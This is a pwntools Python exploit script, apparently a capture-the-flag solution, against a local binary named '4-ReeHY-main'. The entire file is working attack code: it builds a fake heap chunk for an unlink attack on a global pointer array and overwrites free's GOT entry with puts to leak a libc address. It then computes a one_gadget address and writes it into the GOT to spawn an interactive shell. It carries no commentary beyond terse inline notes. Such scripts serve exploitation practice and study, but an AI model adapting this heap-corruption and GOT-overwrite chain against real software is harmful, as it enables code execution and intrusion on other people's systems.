from pwn import *
debug=1
elf=ELF("./4-ReeHY-main")
libc=ELF("./libc.so.6")
p = process('./4-ReeHY-main')   
#context.log_level = 'debug'
if debug:
    gdb.attach(p,"b *0x400B62")
def init():
    p.recvuntil('$ ')
    p.send('AAAA')
def malloc(index,size,content):
    p.recvuntil('$ ')
    p.send('1')
    p.recvuntil('Input size\n')
    p.send(str(size))
    p.recvuntil('Input cun\n')
    p.send(str(index))
    p.recvuntil('Input content\n')
    p.send(content)    
def delete(index):
    p.recvuntil('$ ')
    p.send('2')
    p.recvuntil('Chose one to dele\n')
    p.send(str(index))
def edit(index,content):
    p.recvuntil('$ ')
    p.send('3')
    p.recvuntil('\n')
    p.send(str(index))
    p.recvuntil('\n')
    p.send(content)
init()
ptr=0x6020E0
malloc(0,0x100,"AAAAAAAA")#ptr 
malloc(1,0x100,"AAAAAAAA")#ptr + 0x10 
malloc(2,0x100,"AAAAAAAA")#ptr + 0x20 
malloc(3,0x100,'AAAAAAAA')
delete(1)
delete(2)
payload=p64(0)+p64(0x101) #prev_size , size
payload+=p64(ptr+0x10-24)#fd 
payload+=p64(ptr+0x10-16)#bk 
payload=payload.ljust(0x100,"A")
payload+=p64(0x100)#prev_size
payload+=p64(0x110)
malloc(1,0x210,payload)
delete(2)
success("unlink")
#chunk 0 = free_got
free_got=elf.got["free"] 
puts_got=elf.got["puts"]
puts_plt=elf.plt["puts"]
edit(1,p64(1)+p64(free_got)+p64(1)+p64(puts_got)+p64(1))
edit(0,p64(puts_plt))#*free_got = puts_plt 
delete(1)
puts_addr = p.recvuntil("\n",drop=True).ljust(8,"\x00")
one_rce = u64(puts_addr)-libc.symbols["puts"]+0x45216
success('one_gadget = '+hex(one_rce))
edit(0,p64(one_rce))
delete(4)
p.interactive()
